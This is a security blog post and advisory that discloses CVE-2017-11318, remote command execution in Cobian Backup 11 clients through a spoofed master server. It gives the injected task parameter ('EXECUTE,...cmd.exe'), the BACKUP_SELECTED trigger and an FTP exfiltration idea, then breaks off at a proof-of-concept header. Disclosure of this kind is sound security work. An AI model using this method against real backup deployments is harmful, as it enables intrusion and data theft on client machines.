The amount of parameters is huge, highlighting the possibility of quickly configuring as destination an external FTP. For example, we could use Cobian Backup to exfiltrate sensitive files through executing a task where one of our FTP is allocated as security copy destination. This is without doubt an attractive possibility. However, when analyzing the rest of configuring parameters we discover an even more interesting fact: pre and post backup events.

Reading Cobian Backup support forum, we could see that these parameters enable, among other things, the possibility of executing external programs before and after doing a backup. Therefore, they provide the possibility of executing commands remotely in every customer.

Once again, we follow the same working model. Therefore, we create the task manually in the server in order to intercept the traffic with a sniffer. Later, we will analyze the task and try to implement it in a script in python.

![Creation of a backup task in a customer](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-20-a-las-0.19.48-300x87.png)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-20-a-las-0.19.48-300x87.png) *Creation of a backup task in a customer*

As it can be observed, an update\_list action is sent together with task parameters including name. In case we want to add a new task in order to execute our command through the events, we should copy the sample task and add the following:

```
EXECUTE,C:WindowsSystem32cmd.exe,
```

This parameter will open a window with cmd in the customer whenever this task is executed (this information could be read in Cobian Backup support forum). And, how do we indicate that we want the newly created task to be executed?

![Servidor solicitando la ejecución de una tarea a un cliente](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-20-a-las-0.26.03-300x46.png)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-20-a-las-0.26.03-300x46.png) *Server requesting task execution to a customer*

Using “BACKUP\_SELECTED”, we indicate the task name (which has been allocated in the previous phase when creating the task) we want to be executed. This small protocol abuse used by Cobian Backup is explained in a python script at the end of this page.

In case we test it:

In the customer, it could be seen how a cmd window has emerged indicating that the program has been executed successfully:

## **Conclusion**

One of the most important Tarlogic Red Team features is our full-time commitment in order to search vulnerabilities in software used by our customers. This results in the discovery of 0-days in many occasions. Some of the results which may seem more interesting will be included in this blog (as this post, or such as we have already done with the [XSS Worm in an elder version of Tempobox OpenText](https://www.tarlogic.com/blog/opentext-tempobox-vulnerabilities/), and some others will be only reported (such as [vulnerabilities found in AeroAdmin](https://www.tarlogic.com/blog/aeroadmin-vulnerability-cve-2017-8893/) and used during a pentest).

It has to be always taken into account the possibility that an attacker may use non-published vulnerabilities to compromise a machine. It is in this point where the measures implemented during the [hardening](https://www.tarlogic.com/operating-system-hardening/) should [make lateral movement difficult in privilege escalation](https://www.tarlogic.com/blog/protection-privilege-escalation/).

## Original advisory – CVE-2017-11318: RCE in Cobian Backup 11

—

Vendor: Cobian

Product: Cobian Backup 11

Discovered by: Juan Manuel Fernandez (@TheXC3LL)

Remote Command Execution

======================

Cobian Backup 11 client allows remote attackers to add and execute new backup tasks when master server is spoofed (man-in-the-middle). Attacker can execute system commands remotely abusing pre-backup events.

```
#Proof of Concept

# Cobian Backup 11 - Remote Command Execution (PoC, it's only pops a cmd window in the client)
# Use a MitM to spoof server and let clients connect to you
